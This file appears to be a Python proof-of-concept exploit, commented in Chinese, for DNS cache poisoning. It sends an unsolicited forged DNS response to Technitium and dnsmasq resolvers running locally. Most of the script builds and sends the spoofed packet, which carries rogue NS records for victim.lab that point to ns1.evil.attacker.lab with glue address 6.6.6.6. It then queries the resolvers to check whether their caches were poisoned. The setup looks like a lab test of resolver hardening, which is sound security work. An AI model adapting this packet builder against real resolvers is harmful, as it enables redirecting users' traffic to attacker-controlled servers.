#!/usr/bin/env python3
"""
PoC: Unsolicited DNS Response — Authority NS RDATA Cache Poisoning

基于 b_results/Spoofed_Response_Authority_NS_RDATA_response.txt 中描述的攻击。

攻击原理：
  向目标解析器直接发送一个伪造的 DNS 响应 (QR=1)，其中：
  - 没有对应的 outstanding query（解析器从未请求过）
  - Transaction ID 为任意值 (4242)
  - Authority 段携带恶意 NS 记录: victim.lab → ns1.evil.attacker.lab
  - Additional 段携带恶意 glue: ns1.evil.attacker.lab → 6.6.6.6

适配到当前环境：
  - example.com → victim.lab（受害域）
  - attacker.net → evil.attacker.lab（攻击者 NS）
  - 目标 1: Technitium (127.0.0.1:5320)
  - 目标 2: dnsmasq (127.0.0.1:5322)

验证方法：
  PoC 发送后，查询 victim.lab NS 记录，看是否被篡改为 ns1.evil.attacker.lab
"""

import socket
import struct
import sys
import time


def encode_dns_name(name: str) -> bytes:
    """将域名编码为 DNS wire format (label sequence)"""
    result = b""
    for label in name.rstrip(".").split("."):
        encoded = label.encode("ascii")
        result += struct.pack("!B", len(encoded)) + encoded
    result += b"\x00"
    return result


def build_spoofed_response() -> bytes:
    """
    构造 PoC 中描述的恶意 DNS 响应包。

    Header:  ID=4242, QR=1, AA=1, RD=1, RA=1, RCODE=0
             QDCOUNT=1, ANCOUNT=0, NSCOUNT=2, ARCOUNT=2
    Question: www.victim.lab A IN
    Authority: victim.lab NS ns1.evil.attacker.lab
               victim.lab NS ns2.evil.attacker.lab
    Additional: ns1.evil.attacker.lab A 6.6.6.6
                ns2.evil.attacker.lab A 6.6.6.7
    """

    # --- Header ---
    tx_id = 4242
    # Flags: QR=1, Opcode=0, AA=1, TC=0, RD=1, RA=1, Z=0, RCODE=0
    # QR(1) | Opcode(4) | AA(1) | TC(1) | RD(1) | RA(1) | Z(3) | RCODE(4)
    # 1 0000 1 0 1   1 000 0000
    # = 0x8580
    flags = 0x8580
    qdcount = 1
    ancount = 0
    nscount = 2
    arcount = 2

    header = struct.pack("!HHHHHH", tx_id, flags, qdcount, ancount, nscount, arcount)

    # --- Question Section ---
    qname = encode_dns_name("www.victim.lab")
    qtype = 1    # A
    qclass = 1   # IN
    question = qname + struct.pack("!HH", qtype, qclass)

    # --- Authority Section ---
    def make_ns_rr(owner: str, nsdname: str, ttl: int = 86400) -> bytes:
        name_wire = encode_dns_name(owner)
        rdata = encode_dns_name(nsdname)
        # TYPE=NS(2), CLASS=IN(1), TTL, RDLENGTH, RDATA
        return name_wire + struct.pack("!HHIH", 2, 1, ttl, len(rdata)) + rdata

    auth1 = make_ns_rr("victim.lab", "ns1.evil.attacker.lab")
    auth2 = make_ns_rr("victim.lab", "ns2.evil.attacker.lab")

    # --- Additional Section ---
    def make_a_rr(owner: str, ip: str, ttl: int = 86400) -> bytes:
        name_wire = encode_dns_name(owner)
        ip_bytes = socket.inet_aton(ip)
        # TYPE=A(1), CLASS=IN(1), TTL, RDLENGTH=4, RDATA
        return name_wire + struct.pack("!HHIH", 1, 1, ttl, 4) + ip_bytes

    add1 = make_a_rr("ns1.evil.attacker.lab", "6.6.6.6")
    add2 = make_a_rr("ns2.evil.attacker.lab", "6.6.6.7")

    return header + question + auth1 + auth2 + add1 + add2


def send_to_target(target_ip: str, target_port: int, payload: bytes, label: str):
    """通过 UDP 发送伪造响应到目标解析器"""
    print(f"\n{'='*60}")
    print(f"目标: {label} ({target_ip}:{target_port})")
    print(f"{'='*60}")
    print(f"  发送伪造 DNS 响应 (QR=1, ID=4242)")
    print(f"  Question: www.victim.lab A")
    print(f"  Authority: victim.lab NS ns1.evil.attacker.lab")
    print(f"             victim.lab NS ns2.evil.attacker.lab")
    print(f"  Additional: ns1.evil.attacker.lab A 6.6.6.6")
    print(f"              ns2.evil.attacker.lab A 6.6.6.7")
    print(f"  包大小: {len(payload)} bytes")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    try:
        sock.sendto(payload, (target_ip, target_port))
        print(f"  [已发送] 伪造响应已发送至 {target_ip}:{target_port}")
    except Exception as e:
        print(f"  [错误] 发送失败: {e}")
    finally:
        sock.close()


def query_and_check(target_ip: str, target_port: int, qname: str, qtype: int, label: str) -> str:
    """发送一个正常的 DNS 查询并返回结果"""
    # 构造查询
    tx_id = 0x1234
    flags = 0x0100  # RD=1
    header = struct.pack("!HHHHHH", tx_id, flags, 1, 0, 0, 0)
    question = encode_dns_name(qname) + struct.pack("!HH", qtype, 1)
    query = header + question

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    try:
        sock.sendto(query, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        return data
    except socket.timeout:
        return None
    finally:
        sock.close()


def parse_response_brief(data: bytes, label: str):
    """简要解析 DNS 响应，显示关键段落"""
    if data is None:
        print(f"  [超时] 未收到响应")
        return False

    if len(data) < 12:
        print(f"  [错误] 响应太短 ({len(data)} bytes)")
        return False

    tx_id, flags, qdcount, ancount, nscount, arcount = struct.unpack("!HHHHHH", data[:12])
    rcode = flags & 0x0F
    aa = (flags >> 10) & 1

    rcode_names = {0: "NOERROR", 1: "FORMERR", 2: "SERVFAIL", 3: "NXDOMAIN", 5: "REFUSED"}
    rcode_str = rcode_names.get(rcode, f"RCODE={rcode}")

    print(f"  响应: {rcode_str}, AA={aa}, ANSWER={ancount}, AUTHORITY={nscount}, ADDITIONAL={arcount}")

    # 简单遍历所有 RR 段以检测是否包含恶意 NS
    raw = data[12:]
    poisoned = False

    try:
        # 跳过 Question
        for _ in range(qdcount):
            raw, _ = skip_name(raw)
            raw = raw[4:]  # QTYPE + QCLASS

        # 解析 Answer + Authority + Additional
        for section_name, count in [("ANSWER", ancount), ("AUTHORITY", nscount), ("ADDITIONAL", arcount)]:
            for _ in range(count):
                raw, rr_name = read_name_from_packet(data, len(data) - len(raw))
                offset_in_raw = len(data) - len(raw)
                rr_type, rr_class, rr_ttl, rdlen = struct.unpack("!HHIH", raw[:10])
                rdata_raw = raw[10:10+rdlen]
                raw = raw[10+rdlen:]

                type_names = {1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 28: "AAAA"}
                type_str = type_names.get(rr_type, f"TYPE{rr_type}")

                if rr_type == 2:  # NS
                    _, ns_name = read_name_from_packet(data, offset_in_raw + 10)
                    print(f"    {section_name}: {rr_name} {type_str} {ns_name} (TTL={rr_ttl})")
                    if "evil" in ns_name.lower():
                        poisoned = True
                        print(f"    ⚠️  检测到恶意 NS 记录！缓存已被投毒！")
                elif rr_type == 1:  # A
                    if rdlen == 4:
                        ip = socket.inet_ntoa(rdata_raw)
                        print(f"    {section_name}: {rr_name} {type_str} {ip} (TTL={rr_ttl})")
                else:
                    print(f"    {section_name}: {rr_name} {type_str} (TTL={rr_ttl})")
    except Exception:
        pass

    return poisoned


def skip_name(raw: bytes):
    """跳过 DNS name（不解析，仅跳过）"""
    pos = 0
    while True:
        if pos >= len(raw):
            break
        length = raw[pos]
        if length == 0:
            pos += 1
            break
        if (length & 0xC0) == 0xC0:
            pos += 2
            break
        pos += 1 + length
    return raw[pos:], ""


def read_name_from_packet(packet: bytes, offset: int) -> tuple:
    """从完整 packet 的指定 offset 读取 DNS name（支持指针压缩）"""
    labels = []
    visited = set()
    original_offset = offset
    jumped = False
    bytes_consumed = 0

    while True:
        if offset in visited or offset >= len(packet):
            break
        visited.add(offset)

        length = packet[offset]
        if length == 0:
            if not jumped:
                bytes_consumed = offset - original_offset + 1
            offset += 1
            break
        elif (length & 0xC0) == 0xC0:
            if not jumped:
                bytes_consumed = offset - original_offset + 2
                jumped = True
            pointer = struct.unpack("!H", packet[offset:offset+2])[0] & 0x3FFF
            offset = pointer
        else:
            offset += 1
            label = packet[offset:offset+length].decode("ascii", errors="replace")
            labels.append(label)
            offset += length

    name = ".".join(labels) + "." if labels else "."

    if not jumped:
        bytes_consumed = offset - original_offset

    return (packet[original_offset + bytes_consumed:] if not jumped else packet[original_offset + bytes_consumed:]), name


def main():
    payload = build_spoofed_response()

    targets = [
        ("127.0.0.1", 5320, "Technitium"),
        ("127.0.0.1", 5322, "dnsmasq"),
    ]

    print("=" * 60)
    print(" PoC: Unsolicited DNS Response — Authority NS RDATA")
    print(" 基于 Spoofed_Response_Authority_NS_RDATA_response.txt")
    print("=" * 60)

    # Phase 1: 发送前先查询 victim.lab NS，记录原始状态
    print("\n" + "=" * 60)
    print(" Phase 1: 攻击前 — 查询 victim.lab NS 基线状态")
    print("=" * 60)
    for ip, port, name in targets:
        print(f"\n  [{name}] 查询 victim.lab NS:")
        resp = query_and_check(ip, port, "victim.lab", 2, name)  # NS=2
        parse_response_brief(resp, name)

    # Phase 2: 发送伪造响应
    print("\n" + "=" * 60)
    print(" Phase 2: 发送伪造 DNS 响应 (Unsolicited)")
    print("=" * 60)
    for ip, port, name in targets:
        send_to_target(ip, port, payload, name)

    time.sleep(2)

    # Phase 3: 攻击后再次查询 victim.lab NS
    print("\n" + "=" * 60)
    print(" Phase 3: 攻击后 — 查询 victim.lab NS 检测投毒")
    print("=" * 60)
    any_poisoned = False
    for ip, port, name in targets:
        print(f"\n  [{name}] 查询 victim.lab NS:")
        resp = query_and_check(ip, port, "victim.lab", 2, name)
        if parse_response_brief(resp, name):
            any_poisoned = True

    # Phase 4: 额外验证 — 查询 www.victim.lab A，看是否被劫持
    print("\n" + "=" * 60)
    print(" Phase 4: 额外验证 — 查询 www.victim.lab A")
    print("=" * 60)
    for ip, port, name in targets:
        print(f"\n  [{name}] 查询 www.victim.lab A:")
        resp = query_and_check(ip, port, "www.victim.lab", 1, name)
        if parse_response_brief(resp, name):
            any_poisoned = True

    # 总结
    print("\n" + "=" * 60)
    if any_poisoned:
        print(" ⚠️  结论: 检测到缓存投毒！存在漏洞！")
    else:
        print(" ✅ 结论: 未检测到缓存投毒。两个目标均正确丢弃了")
        print("    未经请求的伪造 DNS 响应。符合预期。")
    print("=" * 60)


if __name__ == "__main__":
    main()
